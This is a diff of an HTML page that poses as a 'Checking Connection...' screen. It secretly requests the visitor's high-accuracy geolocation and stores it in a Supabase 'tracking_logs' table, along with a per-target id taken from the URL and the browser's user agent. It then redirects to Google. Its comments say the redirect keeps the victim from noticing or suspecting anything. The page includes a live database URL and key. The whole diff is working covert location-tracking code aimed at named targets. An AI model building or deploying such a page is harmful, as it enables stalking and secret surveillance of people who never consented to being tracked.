@@ -1,39 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Connecting...</title>
+    <title>Checking Connection...</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
-<body style="background-color: white;">
+<body style="background-color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
+    
+    <div id="status">Connecting to server...</div>
+
     <script>
+        // 1. Supabase Configuration
         const supabaseUrl = 'https://nhhcijrjrcxznsqltzom.supabase.co';
         const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5oaGNpanJqcmN4em5zcWx0em9tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM5MTMyODAsImV4cCI6MjA4OTQ4OTI4MH0.1CG80rxN01S00lCQ1gkqyKdenDJR_XjM0uQtEAln9XU';
-        const supabase = supabase.createClient(supabaseUrl, supabaseKey);
+        const supabaseClient = supabase.createClient(supabaseUrl, supabaseKey);
 
-        async function start() {
-            const params = new URLSearchParams(window.location.search);
-            const id = params.get('id') || 'Anon_User';
+        async function startTracking() {
+            // URL parameter theke ID neya (e.g. ?id=target1)
+            const urlParams = new URLSearchParams(window.location.search);
+            const userId = urlParams.get('id') || 'Anonymous_Visitor';
 
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    // Database-e data pathano
-                    await supabase.from('tracking_logs').insert([{ 
-                        user_identifier: id, 
-                        latitude: pos.coords.latitude, 
-                        longitude: pos.coords.longitude 
-                    }]);
-                    
-                    // Location pawa gele shathe shathe Google-e pathiye dao
-                    window.location.replace("https://www.google.com");
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+
+                    // 2. Data Insert into Supabase
+                    const { error } = await supabaseClient
+                        .from('tracking_logs') 
+                        .insert([{ 
+                            user_identifier: userId, 
+                            latitude: lat, 
+                            longitude: lon,
+                            device_info: navigator.userAgent
+                        }]);
+
+                    if (!error) {
+                        // Success hole user-ke Google-e pathiye dao jate kichu na bujhe
+                        window.location.replace("https://www.google.com");
+                    }
                 }, (err) => {
-                    // Permission na dileo Google-e pathiye dao jate shondeho na kore
+                    // Permission block korle ba error holeo Google-e pathiye dao
                     window.location.replace("https://www.google.com");
                 }, { enableHighAccuracy: true });
             } else {
                 window.location.replace("https://www.google.com");
             }
         }
-        window.onload = start;
+
+        // Run when page loads
+        window.onload = startTracking;
     </script>
 </body>
 </html>
